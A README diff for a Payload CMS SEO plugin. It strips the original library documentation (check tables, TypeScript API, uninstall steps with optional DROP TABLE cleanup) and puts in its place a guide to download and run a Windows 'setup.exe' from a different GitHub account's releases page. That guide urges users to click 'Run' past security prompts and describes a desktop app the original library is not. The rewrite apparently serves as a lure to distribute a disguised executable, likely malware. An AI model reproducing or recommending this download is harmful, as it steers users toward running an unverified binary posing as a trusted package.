-| `linking-external` | 1 | Bonus | At least one external link |
-| `linking-generic-anchors` | 2 | Important | No generic anchor text |
-| `linking-empty` | 2 | Important | No empty links |
-
-</details>
-
-<details>
-<summary><strong>Social (3 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `social-og-image` | 2 | Important | OG/meta image defined |
-| `social-title-truncation` | 1 | Bonus | Title within social platform limits (~65 chars) |
-| `social-desc-length` | 1 | Bonus | Description within Facebook/LinkedIn limits (~155 chars) |
-
-</details>
-
-<details>
-<summary><strong>Schema (1 check)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `schema-readiness` | 1 | Bonus | Page has enough metadata for JSON-LD generation |
-
-</details>
-
-<details>
-<summary><strong>Readability (7 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `readability-flesch` | 2 | Important | Flesch reading ease (FR: >= 40, EN: >= 60) |
-| `readability-long-sentences` | 2 | Important | Long sentence ratio < 30% (FR: >25 words, EN: >20 words) |
-| `readability-long-paragraphs` | 2 | Important | No paragraphs over 150 words |
-| `readability-passive` | 2 | Important | Passive voice ratio (FR: < 15%, EN: < 10%) |
-| `readability-transitions` | 1 | Bonus | Transition words (FR: 15%+, EN: 20%+) |
-| `readability-consecutive-starts` | 1 | Bonus | No 3+ consecutive sentences with same first word |
-| `readability-long-sections` | 2 | Important | No sections >400 words without subheadings |
-
-</details>
-
-<details>
-<summary><strong>Quality (2 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `quality-no-duplicate` | 3 | Critical | No duplicate or generic content |
-| `quality-substantial` | 3 | Critical | Enough content substance (>50 words fail, >200 warning) |
-
-</details>
-
-<details>
-<summary><strong>Secondary Keywords (4 checks per keyword, up to 3 keywords)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `secondary-kw-title-*` | 1 | Bonus | Secondary keyword in title |
-| `secondary-kw-desc-*` | 1 | Bonus | Secondary keyword in description |
-| `secondary-kw-content-*` | 1 | Bonus | Secondary keyword in content |
-| `secondary-kw-heading-*` | 1 | Bonus | Secondary keyword in H2/H3 |
-
-</details>
-
-<details>
-<summary><strong>Cornerstone (4 checks, only when isCornerstone is true)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `cornerstone-wordcount` | 4 | Important | 1500+ words for pillar content |
-| `cornerstone-internal-links` | 4 | Important | 5+ internal links |
-| `cornerstone-focus-keyword` | 5 | Critical | Focus keyword is defined |
-| `cornerstone-meta-description` | 5 | Critical | Meta description is present and optimized |
-
-</details>
-
-<details>
-<summary><strong>Freshness (4 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `freshness-age` | 1-3 | Bonus/Important | Content updated within 6/12 months |
-| `freshness-reviewed` | 2 | Bonus | Content reviewed within 6 months |
-| `freshness-year-ref` | 2 | Important | Current year referenced in content |
-| `freshness-thin-aging` | 3 | Important | Thin + old content penalty |
-
-</details>
-
-<details>
-<summary><strong>Technical (3 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `canonical-*` | 2 | Important | Canonical URL is valid and correctly set |
-| `robots-noindex` | 2-3 | Important/Critical | Noindex directive detection |
-| `robots-nofollow` | 2 | Important | Nofollow directive detection |
-
-</details>
-
-<details>
-<summary><strong>Accessibility (8 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `a11y-short-anchors` | 2 | Important | No links with text under 3 characters |
-| `a11y-alt-quality` | 2 | Important | No generic or filename-based alt texts |
-| `a11y-empty-headings` | 3 | Critical | No empty heading tags |
-| `a11y-duplicate-links` | 1 | Bonus | No adjacent duplicate links |
-| `a11y-all-caps` | 1 | Bonus | No all-caps headings |
-| `a11y-link-density` | 2 | Important | Link text ratio under 30% of content |
-| `a11y-image-filename` | 2 | Important | No camera default filenames in alt |
-| `a11y-alt-duplicates-context` | 1 | Bonus | Alt text differs from adjacent headings |
-
-</details>
-
-<details>
-<summary><strong>E-commerce (7 checks, only when isProduct is true)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `product-price-mentioned` | 2 | Important | Price visible in content |
-| `product-short-description` | 2 | Important | Description >= 100 words |
-| `product-has-images` | 3 | Critical | At least 2 product images |
-| `product-title-includes-brand` | 1 | Bonus | Brand/keyword in meta title |
-| `product-meta-includes-price` | 1 | Bonus | Price in meta description |
-| `product-review-readiness` | 1 | Bonus | Review/rating content detected |
-| `product-availability` | 2 | Important | Availability status mentioned |
-
-</details>
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Collections
-
-The plugin automatically creates and manages these collections (all hidden from admin nav, managed via plugin views):
-
-| Collection | Slug | Description |
-|------------|------|-------------|
-| **SEO Score History** | `seo-score-history` | Score snapshots per document (ID, collection, score, level, word count, keyword, checks summary, date) |
-| **SEO Performance** | `seo-performance` | Search Console data (URL, query, clicks, impressions, CTR, position, date, source) |
-| **SEO Settings** | `seo-settings` | Site-wide config (site name, ignored slugs, disabled rules, thresholds, sitemap config, breadcrumb config) |
-| **SEO Redirects** | `seo-redirects` | 301/302 redirect rules (from, to, type). Slug is configurable via `redirectsCollection` |
-| **SEO Logs** | `seo-logs` | 404 error tracking (URL, type, hit count, last seen, referrer, user agent, ignored flag) |
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Fields Added to Collections
-
-The plugin adds the following fields to each target collection specified in `collections`:
-
-### SEO Analyzer Fields (sidebar)
-
-| Field | Type | Location | Description |
-|-------|------|----------|-------------|
-| `isCornerstone` | `checkbox` | Sidebar | Marks the document as pillar/cornerstone content (triggers enhanced checks) |
-| `focusKeyword` | `text` | Sidebar | Primary SEO focus keyword for analysis |
-| `seoAnalyzer` | `ui` | Sidebar | Real-time SEO analysis widget with score, checks, and actionable tips |
-| `focusKeywords` | `array` (max 3) | Collapsible group | Secondary focus keywords for additional coverage |
-
-### Meta Fields (auto-created)
-
-When `@payloadcms/plugin-seo` is **not detected** on a collection, the plugin auto-creates a `meta` field group with generate buttons and SERP preview. Set `autoCreateMetaFields: false` to disable.
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `meta._overview` | `ui` | Completeness indicator (0/3 to 3/3 — title, description, image) |
-| `meta.title` | `text` | Meta title with character counter (30-60), progress bar, and "Generate" button |
-| `meta.description` | `textarea` | Meta description with character counter (120-160) and "Generate" button |
-| `meta.image` | `upload` | Meta/OG image with status indicator and optional "Generate" button |
-| `meta._preview` | `ui` | Google SERP preview (desktop + mobile toggle, Google 2025 styling) |
-
-> **Compatibility with `@payloadcms/plugin-seo`:** If the official plugin is already adding meta fields to a collection, our plugin detects this and skips auto-creation. Both plugins can safely coexist.
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Programmatic Usage
-
-The analyzer can be used independently of the Payload plugin system:
-
-```ts
-import { analyzeSeo } from '@consilioweb/seo-analyzer'
-import type { SeoInput, SeoConfig } from '@consilioweb/seo-analyzer'
-
-const input: SeoInput = {
-  metaTitle: 'My Page Title - Brand',
-  metaDescription: 'A comprehensive description of my page for search engines...',
-  slug: 'my-page',
-  focusKeyword: 'my keyword',
-  heroTitle: 'Welcome to My Page',
-  heroRichText: { /* Lexical JSON root node */ },
-  blocks: [ /* Payload layout blocks */ ],
-  content: { /* Lexical JSON for posts */ },
-  isPost: false,
-  isProduct: false,
-  isCornerstone: false,
-  updatedAt: '2025-06-01T00:00:00Z',
-}
-
-const config: SeoConfig = {
-  siteName: 'Brand',
-  localSeoSlugs: ['paris', 'lyon'],
-  disabledRules: ['social'],
-  thresholds: { minWordsPost: 1000 },
-}
-
-const result = analyzeSeo(input, config)
-// {
-//   score: 78,
-//   level: 'good',
-//   checks: [
-//     { id: 'title-length', status: 'pass', message: '...', weight: 3, ... },
-//     { id: 'content-wordcount', status: 'warning', message: '...', weight: 2, ... },
-//     ...
-//   ]
-// }
-```
-
-### Exported Helpers
-
-The package re-exports utility functions for advanced use cases:
-
-```ts
-import {
-  // Lexical JSON parsing
-  extractTextFromLexical,
-  extractHeadingsFromLexical,
-  extractLinksFromLexical,
-  extractImagesFromLexical,
-  extractLinkUrlsFromLexical,
-  extractListsFromLexical,
-  checkImagesInBlocks,
-
-  // Text analysis (bilingual — pass locale: 'fr' | 'en')
-  countWords,
-  countSentences,       // countSentences(text, locale?)
-  countSyllablesFR,     // French syllable counter
-  countSyllablesEN,     // English syllable counter
-  calculateFlesch,      // calculateFlesch(text, locale) — Kandel-Moles (FR) or Flesch-Kincaid (EN)
-  calculateFleschFR,    // Legacy alias for calculateFlesch(text, 'fr')
-  detectPassiveVoice,   // detectPassiveVoice(sentence, locale?)
-  hasTransitionWord,    // hasTransitionWord(sentence, locale?)
-  checkHeadingHierarchy,
-  countLongSections,
-
-  // Keyword utilities
-  normalizeForComparison,
-  slugifyKeyword,
-  keywordMatchesText,
-  countKeywordOccurrences,
-
-  // Page type detection (bilingual)
-  detectPageType,       // detectPageType(slug, collection?, extra?, locale?)
-
-  // Bilingual constant accessors — pass locale: 'fr' | 'en'
-  getStopWords,         // getStopWords(locale)
-  getActionVerbs,       // getActionVerbs(locale)
-  getPowerWords,        // getPowerWords(locale)
-  getGenericAnchors,    // getGenericAnchors(locale)
-  getLegalSlugs,        // getLegalSlugs(locale)
-  getUtilitySlugs,      // getUtilitySlugs(locale)
-  getEvergreenSlugs,    // getEvergreenSlugs(locale)
-  getStopWordCompounds, // getStopWordCompounds(locale)
-
-  // Legacy aliases (backward compat)
-  getStopWordsFR,       // = getStopWords('fr')
-  getActionVerbsFR,     // = getActionVerbs('fr')
-  POWER_WORDS_FR,       // = POWER_WORDS.fr
-  isStopWordInCompoundExpression,
-
-  // Locale-specific thresholds
-  FLESCH_THRESHOLDS,        // { fr: { pass: 40, warn: 25 }, en: { pass: 60, warn: 40 } }
-  READABILITY_THRESHOLDS,   // { fr: { longSentenceWords: 25, ... }, en: { longSentenceWords: 20, ... } }
-
-  // Constants (thresholds, limits)
-  TITLE_LENGTH_MIN,     // 30
-  TITLE_LENGTH_MAX,     // 60
-  META_DESC_LENGTH_MIN, // 120
-  META_DESC_LENGTH_MAX, // 160
-  MIN_WORDS_POST,       // 800
-  MIN_WORDS_GENERIC,    // 300
-  SCORE_EXCELLENT,      // 91
-  SCORE_GOOD,           // 71
-  SCORE_OK,             // 41
-  // ... and more
-} from '@consilioweb/seo-analyzer'
-```
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Page Type Detection
-
-The analyzer automatically adapts thresholds and check severity based on the detected page type:
-
-| Page Type | Detection Logic (FR) | Detection Logic (EN) | Adapted Behavior |
-|-----------|---------------------|----------------------|------------------|
-| `blog` | `isPost: true` | `isPost: true` | Higher word count threshold (800 words) |
-| `home` | Slug is `home` or empty | Slug is `home` or empty | Standard checks |
-| `contact` | `contact` | `contact`, `contact-us`, `get-in-touch` | Relaxed: images optional, external links optional, freshness lenient |
-| `form` | `formulaire`, `devis`, `inscription` | `quote`, `signup`, `register`, `apply` | Relaxed: word count min 150, images optional |
-| `legal` | `mentions-legales`, `cgv`, `politique-de-confidentialite` | `privacy-policy`, `terms`, `tos`, `gdpr`, `cookies` | Relaxed: word count min 200, images optional, freshness 24 months |
-| `local-seo` | Matches configured `localSeoSlugs` | Matches configured `localSeoSlugs` | Standard checks with local SEO context |
-| `service` | `service`, `prestation` | `services`, `our-services` | Standard checks |
-| `resource` | `ressource`, `guide`, `tutoriel` | `resources`, `guide`, `tutorial` | Standard checks |
-| `agency` | `agence`, `a-propos`, `equipe` | `about`, `about-us`, `team` | Standard checks |
-| `generic` | Default fallback | Default fallback | Standard checks (300 words min) |
-
-> **Note:** Page type detection checks both FR and EN slug patterns regardless of locale, so a French site with an `about` slug will still be correctly detected.
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Package Exports
-
-The package provides three entry points for different use contexts:
-
-```ts
-// Main entry — plugin, analyzer, types, helpers, constants
-import {
-  seoAnalyzerPlugin, analyzeSeo, seoFields, metaFields,
-  resolveAnalysisLocale, fetchAllDocs, createGenerateHandler,
-} from '@consilioweb/seo-analyzer'
-import type { GenerateFnArgs, MetaFieldsConfig } from '@consilioweb/seo-analyzer'
-
-// Client components — React components for Payload admin UI
-import {
-  SeoAnalyzerField,
-  SeoNavLink,
-  ScoreHistoryChart,
-  ContentDecaySection,
-  SeoSocialPreview,
-  // Meta field components (used internally, also available for custom layouts)
-  MetaTitleField,
-  MetaDescriptionField,
-  MetaImageField,
-  OverviewField,
-  SerpPreview,
-} from '@consilioweb/seo-analyzer/client'
-
-// Server views — admin views wrapped in DefaultTemplate
-import {
-  SeoView,
-  SitemapAuditView,
-  SeoConfigView,
-  RedirectManagerView,
-  CannibalizationView,
-  PerformanceView,
-  KeywordResearchView,
-  SchemaBuilderView,
-  LinkGraphView,
-} from '@consilioweb/seo-analyzer/views'
-```
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Requirements
-
-- **Node.js** >= 18
-- **Payload CMS** 3.x
-- **React** 18.x or 19.x (for admin UI components)
-- **Database**: Any Payload-supported adapter (SQLite, PostgreSQL, MongoDB)
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Uninstall
-
-One command handles everything — code cleanup, package removal, and importmap regeneration:
-
-```bash
-npx seo-analyzer-uninstall
-```
-
-The script automatically:
-1. Scans `src/` and removes all `import` statements and `seoAnalyzerPlugin()` / `seoPlugin()` calls
-2. Runs `pnpm remove @consilioweb/seo-analyzer` (detects your package manager)
-3. Regenerates the Payload importmap
-
-No manual editing needed.
-
-### What happens to your data?
-
-**Your data is safe.** The plugin uses Payload's standard API (`payload.find`, `payload.create`, etc.) with zero raw SQL queries — it is fully **database-agnostic** and works identically with SQLite, PostgreSQL, and MongoDB.
-
-When you remove the plugin:
-
-| What | Status | Action needed |
-|------|--------|---------------|
-| Plugin collections (`seo-score-history`, `seo-performance`, `seo-settings`, `seo-redirects`, `seo-logs`) | **Tables/documents remain in DB** | Delete manually if you want to reclaim space |
-| Fields added to your collections (`focusKeyword`, `focusKeywords`, `isCornerstone`) | **Data remains in DB** | Columns/fields are ignored by Payload but stay in storage |
-| Admin views & API endpoints | **Removed automatically** | No action needed |
-| Hooks (auto-redirect, score tracking) | **Removed automatically** | No action needed |
-
-### Full cleanup (optional)
-
-If you want to remove all plugin data from your database:
-
-**SQLite:**
-```sql
-DROP TABLE IF EXISTS seo_score_history;
-DROP TABLE IF EXISTS seo_performance;
-DROP TABLE IF EXISTS seo_settings;
-DROP TABLE IF EXISTS seo_redirects;
-DROP TABLE IF EXISTS seo_logs;
-```
-
-**PostgreSQL:**
-```sql
-DROP TABLE IF EXISTS "seo-score-history" CASCADE;
-DROP TABLE IF EXISTS "seo-performance" CASCADE;
-DROP TABLE IF EXISTS "seo-settings" CASCADE;
-DROP TABLE IF EXISTS "seo-redirects" CASCADE;
-DROP TABLE IF EXISTS "seo-logs" CASCADE;
-```
-
-**MongoDB:**
-```js
-db.getCollection('seo-score-history').drop()
-db.getCollection('seo-performance').drop()
-db.getCollection('seo-settings').drop()
-db.getCollection('seo-redirects').drop()
-db.getCollection('seo-logs').drop()
-```
-
-> **Note:** The plugin never drops tables or deletes data automatically. This is by design — your SEO history and redirects are valuable data that should only be removed intentionally.
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## License
-
-[MIT](LICENSE)
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-<div align="center">
-
-### Author
-
-**Made with passion by [ConsilioWEB](https://consilioweb.fr)**
-
-<a href="https://www.linkedin.com/in/christophe-lopez/">
-  <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
-</a>
-<a href="https://github.com/pOwn3d">
-  <img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
-</a>
-<a href="https://consilioweb.fr">
-  <img src="https://img.shields.io/badge/Website-consilioweb.fr-3B82F6?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-</a>
-
-<br><br>
-
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=100&section=footer" width="100%"/>
-
-</div>
+You do not need any special software before downloading. The installer will include everything you need.
+
+---
+
+## 🎯 Topics Covered by This Tool
+
+This tool focuses on:
+
+- SEO audit for websites
+- French language readability checks
+- Sitemap and redirects validation
+- Structured data and meta-tag evaluation
+- Performance tracking to help SEO
+- Integration with Payload CMS 3
+- Support for Lexical JSON data
+- Admin views for easy monitoring
+- User-friendly interface with no programming needed
+
+---
+
+## 🌐 How to Download and Install on Windows
+
+1. **Visit the Downloads Page**
+
+   Click the big green button at the top or visit this page:
+
+   https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer/releases
+
+   This page lists the latest versions available. Look for the Windows installer file, usually named something like `payload-seo-analyzer-setup.exe`.
+
+2. **Download the Installer**
+
+   Click on the `.exe` installer file to start the download. A file of about 50 MB will save to your computer. This process may take a few minutes depending on your internet speed.
+
+3. **Run the Installer**
+
+   Locate the downloaded file in your `Downloads` folder. Double-click to run it.
+
+   - If you see a security prompt, click "Run".
+   - Follow the on-screen instructions.
+   - Accept the license agreement.
+   - Choose the default install location or pick a folder you prefer.
+   - Click "Install".
+
+4. **Finish Setup**
+
+   Once installation finishes, click "Finish". The application may open automatically.
+
+---
+
+## ▶️ How to Use payload-seo-analyzer
+
+After installation, launch the app from your desktop or Start menu.
+
+1. **Open the Application**
+
+   The main interface will open showing a dashboard with different tabs.
+
+2. **Load Your Website URL**
+
+   Enter the address of the website you want to analyze in the input box labeled "Website URL". Ensure the URL starts with `http://` or `https://`.
+
+3. **Start the SEO Audit**
+
+   Click the "Start Analysis" button. The app will run over 50 SEO checks. These include examining meta tags, sitemap structure, redirects, keyword use, page speed trends, and French readability.
+
+4. **View Your Reports**
+
+   The app displays results in nine organized views:
+
+   - Overview: Summary of your site's SEO status
+   - Content Checks: Word counts, keyword analysis
+   - Readability: French Flesch score and suggestions
+   - Meta Tags: Titles, descriptions, canonical tags
+   - Redirects: Detect broken or looping redirects
+   - Sitemap: Check sitemap validity and consistency
+   - Performance: Track page load speed and score
+   - Structured Data: Validate JSON-LD and schema markup
+   - Settings: Customize the plugin parameters
+
+5. **Save or Export Reports**
+
+   Use the "Export Report" button to download reports in JSON or PDF formats. This lets you keep track of changes or send data to your SEO specialist.
+
+---
+
+## ⚙️ Key Features
+
+- **Wide Support:** Works with Payload CMS 3 and Next.js projects.
+- **Content-Driven:** Checks over 50 SEO factors automatically.
+- **French Language Focus:** Includes Flesch readability score adapted for French.
+- **Simple Interface:** Nine admin views make SEO data easy to understand.
+- **Redirect & Sitemap Audit:** Quickly find issues to fix.
+- **Performance Tracking:** Watch your site speed trends over time.
+- **Lexical JSON Support:** Works with structured JSON data for SEO.
+- **Cross-Platform:** Runs well on modern Windows systems.
+
+---
+
+## 🔧 Troubleshooting
+
+If you encounter issues:
+
+- Confirm you are running Windows 10 or newer.
+- Check your internet connection; some checks require web access.
+- Restart the application.
+- Make sure you entered a valid website URL starting with `http://` or `https://`.
+- If the app crashes during analysis, install the latest version from the release page again.
+- Close any other heavy applications to free up memory.
+
+If problems persist, open an issue on the GitHub repository page.
+
+---
+
+## 📄 License and Source
+
+This application is open source. You can view and contribute to the code on GitHub:
+
+https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer
+
+---
+
+## ⬇️ Download Link Again
+
+Use this link to reach the download page and get the latest Windows version:
+
+https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer/releases
+
+Click the `.exe` file and follow the installation steps described above.
